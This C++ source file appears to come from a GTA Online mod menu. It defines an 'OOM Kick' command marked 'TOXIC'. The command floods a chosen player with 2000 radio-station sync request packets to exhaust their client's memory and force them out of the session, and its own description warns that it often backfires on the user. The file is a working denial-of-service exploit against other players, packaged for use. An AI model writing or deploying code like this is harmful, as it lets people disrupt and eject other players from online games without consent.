#include "backend/player_command.hpp"
#include "core/scr_globals.hpp"
#include "natives.hpp"
#include "packet.hpp"
#include "pointers.hpp"
#include "util/scripts.hpp"

#include <network/snSession.hpp>

namespace big
{
	class oom_kick : player_command
	{
		using player_command::player_command;

		virtual CommandAccessLevel get_access_level()
		{
			return CommandAccessLevel::TOXIC;
		}

		virtual void execute(player_ptr player, const std::vector<uint64_t>& _args, const std::shared_ptr<command_context> ctx)
		{
			packet msg{};

			msg.write_message(rage::eNetMessage::MsgRadioStationSyncRequest);
			auto msg_id = player->get_session_player()->m_msg_id;

			for (int j = 0; j < 2000; j++)
			{
				msg.send(msg_id);
			}
		}
	};

	oom_kick g_oom_kick("oomkick", "OOM Kick", "Causes the player to be kicked with an alert. This kick has a high chance of backfiring in its current state", 0, false);
}